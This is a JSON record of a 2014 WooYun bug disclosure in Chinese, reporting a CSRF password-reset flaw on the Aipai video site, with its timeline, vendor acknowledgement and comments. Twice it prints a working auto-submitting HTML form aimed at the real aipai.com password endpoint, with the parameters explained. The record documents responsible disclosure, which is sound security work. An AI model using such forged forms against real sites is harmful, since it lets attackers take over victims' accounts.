{"id": 51563, "wybug_id": "wooyun-2014-074092", "wybug_title": "爱拍原创视频网csrf任意用户密码重置漏洞", "wybug_corp": "爱拍", "wybug_author": "q601333824", "wybug_date": "2014-08-27 19:17", "wybug_open_date": "2014-10-11 19:18", "wybug_type": "网络设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-11：\t细节向公众公开  简要描述： 爱拍原创视频网任意用户密码重置漏洞 详细说明：       1.下面这是爱拍网站密码重置提交的一段代码，我来做两个测试，就知道问题出在哪里了 \n<html><body><form id=\"csrf\" name=\"csrf\" action=\"http://home.aipai.com/28857310?action=updateInfo&sub=password\" method=\"POST\"><input type=\"text\" name=\"fromQQ\" value=\"1\" /><input type=\"text\" name=\"xmima3\" value=\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\" /><input type=\"text\" name=\"xmima\" value=\"q601333824\" /><input type=\"text\" name=\"xmima2\" value=\"q601333824\" /><input type=\"text\" name=\"bid\" value=\"28857310\" /><input type=\"text\" name=\"sid\" value=\"\" /><input type=\"text\" name=\"key\" value=\"\" /><input type=\"text\" name=\"submit.x\" value=\"39\" /><input type=\"text\" name=\"submit.y\" value=\"15\" /></form><script>\tdocument.csrf.submit();</script></body></html>\n   2.上面代码的参数xmima3.代表原密码.xmima代表新密码xmima2,重复新密码,bid,代表拍子号.还有连接http://home.aipai.com/28857310（post地址后面的数字改成拍子号）.-------------------------------------------------------------------------------   3.参数说明完了, 第一个测试，    我把xmima3,原密码，随便打，aaaaaaaaaaaaaaaaaaaaaaa设置为原密码   在看下面一张图 \n\n   4.在用户什么都没有绑定的情况下，访问表单，会提示，旧密码错误，如图\n\n-----------------------------------------------------------------------------------   4,第二个测试     当用户绑定QQ的时候，如图 \n\n    再去访问表单，会出现提示密码，修改成功,如图 \n\n------------------------------------------------------------------------------- 5.上面两个测试可以看出，在用户什么都没绑定的时候，访问重置密码表单，会验证原密码，提示原密码aaaaaaaaa错误，但是神奇的是，当用户绑定了QQ的时候，再访问重置密码表单，并没有验证原密码对不对，从而提示用户，密码修改成功。    漏洞证明：     1. \n<html><body><form id=\"csrf\" name=\"csrf\" action=\"http://home.aipai.com/28857310?action=updateInfo&sub=password\" method=\"POST\"><input type=\"text\" name=\"fromQQ\" value=\"1\" /><input type=\"text\" name=\"xmima3\" value=\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\" /><input type=\"text\" name=\"xmima\" value=\"q601333824\" /><input type=\"text\" name=\"xmima2\" value=\"q601333824\" /><input type=\"text\" name=\"bid\" value=\"28857310\" /><input type=\"text\" name=\"sid\" value=\"\" /><input type=\"text\" name=\"key\" value=\"\" /><input type=\"text\" name=\"submit.x\" value=\"39\" /><input type=\"text\" name=\"submit.y\" value=\"15\" /></form><script>\tdocument.csrf.submit();</script></body></html>\n 2.上面代码的参数xmima3.代表原密码.xmima代表新密码xmima2,重复新密码,bid,代表拍子号.还有连接http://home.aipai.com/28857310（post地址后面的数字改成拍子号）. 3 (1).我把xmima3,原密码，随便打，aaaaaaaaaaaaaaaaaaaaaaa设置为原密码,在看下面一张图 \n\n   (2).在用户什么都没有绑定的情况下，访问表单，会提示，旧密码错误，如图\n\n4. (1).当用户绑定QQ的时候，如图 \n\n    (2).再去访问表单，会出现提示密码，修改成功,如图 \n\n   修复方案：  1.如果目标用户没有绑定了QQ或者人人网站帐号，访问密码重置表单，会提示旧密码错误，重置失败2.但是，如果目标用户绑定了QQ或者人人网站帐号,访问密码重置表单,会提示密码重置成功3.这里的疑问，为什么用户绑定别的帐号的时候，为什么不验证原密码了4.现在用户为了登录方便，大部分都是有帐号绑定的，所以................   版权声明：转载请注明来源 q601333824@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2014-08-28 11:39 厂商回复： 感谢反馈。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-27 19:29 |    \t\t进击的zjx \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:61        | 工作需要，暂别一段时间)\t\t \n  你关注的白帽子 q601333824 发表了漏洞 爱拍原创视频网任意用户密码重置漏洞    \n     2014-08-29 08:05 |    \t\t天际 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:1        | 我只是在打酱油)\t\t \n  你关注的白帽子 q601333824 发表了漏洞 爱拍原创视频网任意用户密码重置漏洞    \n     2014-08-29 12:50 |    \t\tq601333824 \t\t\t( 普通白帽子  |\t\t\t        Rank:217 漏洞数:49        | 出自《丹特丽安的书架》---吾问汝,汝为人否...)\t\t \n  @天际 田鸡    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}